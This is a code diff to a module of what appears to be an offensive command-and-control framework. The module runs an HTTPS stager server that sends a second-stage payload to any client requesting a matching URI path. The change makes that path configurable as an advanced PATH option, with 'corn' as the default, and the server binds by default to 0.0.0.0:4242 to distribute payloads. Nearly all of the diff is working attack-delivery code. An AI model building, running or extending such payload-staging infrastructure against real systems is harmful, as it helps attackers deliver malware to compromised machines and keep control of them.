@@ -16,7 +16,7 @@ class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):
 
     def do_GET(self):
 
-        if ("corn" in self.path):
+        if (self.server.uri_path in self.path):
             log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
             self.wfile.write(struct.pack('<Q', len(self.server.stage)))
             self.wfile.write(self.server.stage)
@@ -77,7 +77,6 @@ class Module():
     description = ("")
 
     arguments = {}
-
     arguments["HANDLER"] = {}
     arguments["HANDLER"]["optional"] = "no"
     arguments["HANDLER"]["description"] = "Handler for incoming connections"
@@ -91,6 +90,11 @@ class Module():
     arguments["SRVPORT"]["optional"] = "yes"
     arguments["SRVPORT"]["description"] = "Port to bind handler to"
 
+    advanced = {}
+    advanced["PATH"] = {}
+    advanced["PATH"]["optional"] = "yes"
+    advanced["PATH"]["description"] = "The path expected to be reached by our payload to send the second stage"
+
     def __init__(self, arg_object):
        
         self.arg_list  = arg_object["positional arguments"]
@@ -100,12 +104,15 @@ class Module():
 
     def set_args(self):
 
-        argv_dict = modparser.argument_check(Module.arguments, self.arg_list)
+        all_args = Module.arguments
+        all_args.update(Module.advanced)
+        argv_dict = modparser.argument_check(all_args, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
         self.handler = argv_dict["HANDLER"]
 
+        # Set the SRVHOST and SRVPORT to distribute payloads
         if "SRVHOST" not in argv_dict.keys():
             self.srvhost = "0.0.0.0"
         else:
@@ -115,6 +122,12 @@ class Module():
             self.srvport = 4242
         else:
             self.srvport = int(argv_dict["SRVPORT"])
+
+        # Set the PATH used by HTTP(S) handlers
+        if "PATH" not in argv_dict.keys():
+            self.uri_path = "corn"
+        else:
+            self.uri_path = argv_dict["PATH"]
 
     def do_thing(self):
 
@@ -144,6 +157,7 @@ class Module():
                                           server_side=True)
 
         httpd.stage = self.stage
+        httpd.uri_path = self.uri_path
 
         httpd.serve_forever()
 
